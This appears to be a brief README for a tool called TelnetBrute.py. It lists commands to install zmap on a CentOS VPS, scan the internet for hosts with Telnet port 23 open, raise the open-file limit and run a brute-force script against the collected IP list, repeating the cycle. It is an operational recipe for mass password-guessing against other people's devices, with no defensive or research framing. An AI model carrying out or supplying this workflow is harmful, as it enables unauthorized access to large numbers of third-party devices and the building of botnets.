[VPS CentOS 6.9 2GB-RAM] 

- Install zmap

yum update -y 

sh zmap_auto_install.sh

- Scan Telnet Ips

zmap -p23 -o mfu.txt -N 15000 

- Bruteforce (Repeat The Process)

1- ulimit -n 999999

2- python TelnetBrute.py mfu.txt 15000 test.txt




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



